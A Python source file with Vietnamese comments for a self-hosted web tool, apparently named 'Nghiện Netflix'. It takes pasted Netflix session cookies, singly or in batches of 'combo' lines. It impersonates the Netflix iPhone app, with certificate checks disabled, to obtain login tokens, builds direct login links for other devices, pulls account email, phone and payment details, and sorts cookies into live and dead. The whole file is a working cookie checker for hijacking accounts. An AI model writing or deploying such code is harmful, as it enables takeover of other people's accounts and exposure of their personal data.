# -*- coding: utf-8 -*-
"""
Nghiện Netflix - Backend (zero-dependency)
Tạo link đăng nhập Netflix trực tiếp từ cookie (nftoken), giống nf-token-generator.
Chạy:  python server.py   ->  mở http://127.0.0.1:8799
"""
import json
import os
import re
import ssl
import sys
import urllib.parse
import urllib.request
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# PORT/HOST: đọc từ biến môi trường để chạy được trên host (Render/HF/Docker).
# - Local (không có biến PORT): chỉ mở 127.0.0.1:8799
# - Có biến PORT (đang deploy/tunnel/LAN): mở 0.0.0.0 cho mọi máy truy cập
PORT = int(os.environ.get("PORT", "8799"))
HOST = os.environ.get("HOST", "0.0.0.0" if os.environ.get("PORT") else "127.0.0.1")
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

# Nhiều falcor path: token + thông tin tài khoản (best-effort)
ACCOUNT_PATHS = [
    '["account","token","default"]',
    '["account","signupCountry"]',
    '["account","email"]',
    '["account","planName"]',
    '["account","currentPlan"]',
    '["account","maxStreams"]',
    '["account","memberSince"]',
    '["account","membershipStatus"]',
    '["account","videoQuality"]',
    '["account","isMember"]',
    '["account","userName"]',
    '["account","phoneNumber"]',
    '["account","paymentType"]',
    '["account","membership"]',
]

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


# --------------------------- Parse cookie ---------------------------
def parse_netscape_cookie_line(line):
    line = line.strip()
    # Chuẩn Netscape: tách bằng Tab
    parts = line.split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    # Dự phòng: Tab bị biến thành dấu cách (hay gặp khi DÁN trên điện thoại)
    if line.startswith(".") or "netflix" in line.lower():
        parts = re.split(r"\s+", line)
        if len(parts) >= 7:
            return {parts[5]: parts[6]}
    return {}


def _decode(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except Exception:
        data = None

    if isinstance(data, list):
        for c in data:
            if isinstance(c, dict):
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    cookie_dict[n] = _decode(v)
    elif isinstance(data, dict):
        if any(k in data for k in COOKIE_KEYS):
            for k in COOKIE_KEYS:
                v = data.get(k)
                if isinstance(v, str):
                    cookie_dict[k] = _decode(v)
        elif isinstance(data.get("cookies"), list):
            for c in data["cookies"]:
                if isinstance(c, dict):
                    n, v = c.get("name"), c.get("value")
                    if n in COOKIE_KEYS and isinstance(v, str):
                        cookie_dict[n] = _decode(v)

    for k in COOKIE_KEYS:
        if k in cookie_dict:
            continue
        # Nhận cả 'Key=value' (Header) lẫn 'Key value' / 'Key\tvalue' (Netscape,
        # kể cả khi Tab bị biến thành dấu cách lúc dán trên điện thoại)
        m = re.search(rf"(?<!\w){re.escape(k)}[=\t ]+([^;,\s]+)", text)
        if m:
            cookie_dict[k] = _decode(m.group(1))

    return cookie_dict


# --------------------------- Netflix API ---------------------------
def _build_url():
    pairs = list(QUERY_PARAMS.items())
    query = urllib.parse.urlencode(pairs, safe="")
    # nhiều path param (falcor)
    extra = "&".join("path=" + urllib.parse.quote(p, safe="") for p in ACCOUNT_PATHS)
    return API_URL + "?" + query + "&" + extra


def _deep_find(obj, keys):
    """Tìm đệ quy giá trị đầu tiên cho 1 trong các key (không phân biệt hoa thường)."""
    keys = [k.lower() for k in keys]
    stack = [obj]
    while stack:
        cur = stack.pop()
        if isinstance(cur, dict):
            for k, v in cur.items():
                if isinstance(k, str) and k.lower() in keys:
                    if isinstance(v, dict) and "value" in v:
                        v = v["value"]
                    if v not in (None, "", {}, []):
                        return v
                stack.append(v)
        elif isinstance(cur, list):
            stack.extend(cur)
    return None


def fetch_account(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Thiếu cookie bắt buộc: NetflixId")

    cookie_parts = [f"NetflixId={netflix_id}"]
    if cookie_dict.get("SecureNetflixId"):
        cookie_parts.append(f"SecureNetflixId={cookie_dict['SecureNetflixId']}")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = "; ".join(cookie_parts)

    req = urllib.request.Request(_build_url(), headers=headers, method="GET")
    with urllib.request.urlopen(req, timeout=30, context=_SSL_CTX) as resp:
        body = resp.read().decode("utf-8", "replace")

    data = json.loads(body)

    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")
    if not token:
        # token có thể nằm chỗ khác -> tìm sâu
        token = _deep_find(data, ["token"])
        if isinstance(token, dict):
            token = token.get("token") or token.get("value")
    if not token:
        raise ValueError("Không tìm thấy token (cookie hết hạn?)")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    info = {
        "country": _deep_find(data, ["signupCountry", "country"]),
        "email": _deep_find(data, ["email", "userName", "emailAddress"]),
        "plan": _deep_find(data, ["planName", "currentPlan", "plan"]),
        "maxStreams": _deep_find(data, ["maxStreams", "numProfiles"]),
        "memberSince": _deep_find(data, ["memberSince"]),
        "membership": _deep_find(data, ["membershipStatus"]),
        "videoQuality": _deep_find(data, ["videoQuality"]),
        "phone": _deep_find(data, ["phoneNumber"]),
        "payment": _deep_find(data, ["paymentType"]),
    }
    return token, expires, info


def fmt_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)


def _quality_from_plan(plan, q):
    if q:
        return str(q)
    p = (plan or "").lower()
    if "premium" in p:
        return "UHD (4K)"
    if "standard" in p:
        return "Full HD"
    if "basic" in p or "ad" in p:
        return "HD"
    return "Unknown"


# Các giá trị coi như "rỗng"
_EMPTY = {"", "unknown", "n/a", "na", "none", "-", "null", "không", "khong"}


def parse_text_info(text):
    """Đọc thông tin tài khoản nhúng sẵn trong file cookie (format checker:
       'NETFLIX ACCOUNT DETAILS / - Name: ... / - Email: ... / - Plan: ...').
       Trả dict các key đã chuẩn hoá."""
    raw = {}
    # Bắt các dòng dạng 'Key: Value' / '- Key: Value' / '– Key: Value'
    # Tiền tố cho phép: khoảng trắng, MỌI loại gạch ngang (- – — ―), *, •, ·, >
    line_re = re.compile(
        "(?im)^[\\s‒–—―−•·\\-\\*>]*"
        "([A-Za-z][A-Za-z0-9 /_'.&\\-]{1,28}?)\\s*:\\s*(.+?)\\s*$"
    )
    for m in line_re.finditer(text):
        key = re.sub(r"\s+", " ", m.group(1).strip().lower())
        val = m.group(2).strip()
        if key in raw:
            continue
        raw[key] = val

    def g(*keys):
        for k in keys:
            v = raw.get(k)
            if v is not None and v.strip().lower() not in _EMPTY:
                return v.strip()
        return None

    return {
        "email": g("email", "mail", "email address", "e-mail"),
        "country": g("country", "country code", "region", "signup country"),
        "plan": g("plan", "plan name", "package", "subscription", "membership plan", "current plan"),
        "price": g("price", "plan price", "amount", "cost", "mrp", "plan amount", "billing amount"),
        "name": g("profiles", "profile", "profile name", "name", "holder", "account name", "full name", "holder name"),
        "memberSince": g("member since", "membersince", "joined", "signup", "registered", "since", "join date"),
        "maxStreams": g("max streams", "maxstreams", "streams", "devices", "screens",
                        "simultaneous streams", "number of devices", "max stream", "device", "max devices"),
        "quality": g("quality", "video quality", "max quality", "resolution", "max resolution"),
        "phone": g("phone", "phone number", "mobile", "tel", "mobile number", "phone no"),
        "payment": g("payment", "payment method", "payment type", "paymenttype", "method", "billing method", "pay method"),
        "nextBilling": g("next billing", "nextbilling", "next billing date", "billing date",
                         "next payment", "renewal", "next renewal", "next invoice", "billing"),
        "hold": g("hold status", "payment hold", "on hold", "hold", "billing hold"),
        "extra": g("extra member", "extra members", "extra", "additional member",
                   "extra member yes/no", "member add ons", "has extra member"),
        "memberMore": g("member add", "thành viên thêm", "extra members count"),
    }


def _pick(*vals):
    for v in vals:
        if v is None:
            continue
        if isinstance(v, str) and v.strip().lower() in _EMPTY:
            continue
        if v == "":
            continue
        return v
    return None


def build_result(raw_cookie):
    """Trả về dict kết quả cho 1 cookie."""
    cookie_dict = extract_cookie_dict(raw_cookie)
    if not cookie_dict.get(REQUIRED_COOKIE):
        return {"ok": False, "live": False, "error": "Không tìm thấy NetflixId trong cookie"}
    try:
        token, expires, info = fetch_account(cookie_dict)
    except Exception as exc:
        return {"ok": False, "live": False, "error": str(exc)}

    links = {
        "computer": "https://www.netflix.com/browse?nftoken=" + token,       # Máy tính (PC)
        "phone": "https://www.netflix.com/unsupported?nftoken=" + token,     # Điện thoại
        "tv": "https://www.netflix.com/tv2?nftoken=" + token,                # Tivi
    }

    # Ghép thông tin: ưu tiên text nhúng trong file -> API -> Unknown
    ti = parse_text_info(raw_cookie)

    member_since = _pick(ti.get("memberSince"), info.get("memberSince"))
    if isinstance(member_since, (int, float)) and member_since > 10_000_000_000:
        member_since = member_since // 1000
    if isinstance(member_since, (int, float)):
        try:
            member_since = datetime.fromtimestamp(member_since).strftime("%B %Y")
        except Exception:
            member_since = str(member_since)

    plan = _pick(ti.get("plan"), info.get("plan"))
    country = _pick(ti.get("country"), info.get("country"))
    email = _pick(ti.get("email"), info.get("email"))
    streams = _pick(ti.get("maxStreams"), info.get("maxStreams"))
    quality = _pick(ti.get("quality")) or _quality_from_plan(plan, info.get("videoQuality"))
    phone = _pick(ti.get("phone"), info.get("phone"))
    payment = _pick(ti.get("payment"), info.get("payment"))

    def U(v):
        return v if v not in (None, "") else "Unknown"

    return {
        "ok": True,
        "live": True,
        "token": token,
        "expires": fmt_expiry(expires),
        "links": links,
        "account": {
            "plan": U(plan),
            "price": U(ti.get("price")),
            "country": U(country),
            "quality": U(quality),
            "maxStreams": U(streams),
            "name": U(ti.get("name")),
            "email": U(email),
            "memberSince": U(member_since),
            "nextBilling": U(ti.get("nextBilling")),
            "payment": U(payment),
            "phone": U(phone),
            "hold": U(ti.get("hold")),
            "extra": U(ti.get("extra")),
            "membership": _pick(info.get("membership")) or "Còn hạn",
        },
    }


# --------------------------- HTTP server ---------------------------
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass  # im lặng

    def _send(self, code, body, ctype="application/json; charset=utf-8"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body, ensure_ascii=False).encode("utf-8")
        elif isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _serve_file(self, path, ctype):
        full = os.path.join(BASE_DIR, path)
        if not os.path.isfile(full):
            self._send(404, {"error": "not found"})
            return
        with open(full, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ("/", "/index.html"):
            self._serve_file("index.html", "text/html; charset=utf-8")
        elif path == "/avatar.jpg":
            self._serve_file("avatar.jpg", "image/jpeg")
        elif path == "/health":
            self._send(200, {"ok": True})
        else:
            self._send(404, {"error": "not found"})

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b"{}"
        try:
            payload = json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            payload = {}

        try:
            if path == "/api/single":
                cookie = payload.get("cookie", "")
                self._send(200, build_result(cookie))

            elif path == "/api/batch":
                items = payload.get("items", [])
                results = [build_result(c) for c in items if str(c).strip()]
                live = sum(1 for r in results if r.get("live"))
                self._send(200, {
                    "ok": True,
                    "total": len(results),
                    "live": live,
                    "dead": len(results) - live,
                    "results": results,
                })

            elif path == "/api/combo":
                lines = payload.get("lines", [])
                out = []
                for line in lines:
                    parts = str(line).split(":")
                    if len(parts) < 3:
                        continue
                    user = parts[0]
                    cookie = ":".join(parts[2:])
                    r = build_result(cookie)
                    r["user"] = user
                    out.append(r)
                live = [r for r in out if r.get("live")]
                self._send(200, {"ok": True, "total": len(out), "live": len(live), "results": live})

            else:
                self._send(404, {"error": "not found"})
        except Exception as exc:
            self._send(500, {"ok": False, "error": str(exc)})


def main():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    os.chdir(BASE_DIR)
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    deployed = bool(os.environ.get("PORT"))
    local_url = f"http://127.0.0.1:{PORT}"
    print("=" * 50)
    print("  NGHIỆN NETFLIX - Server đang chạy")
    print(f"  Lắng nghe: {HOST}:{PORT}")
    if not deployed:
        print("  Mở trình duyệt:  " + local_url)
    print("  Nhấn Ctrl+C để dừng")
    print("=" * 50)
    if not deployed:   # chỉ tự mở trình duyệt khi chạy ở máy cá nhân
        try:
            import webbrowser
            webbrowser.open(local_url)
        except Exception:
            pass
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nĐã dừng server.")
        server.shutdown()


if __name__ == "__main__":
    main()
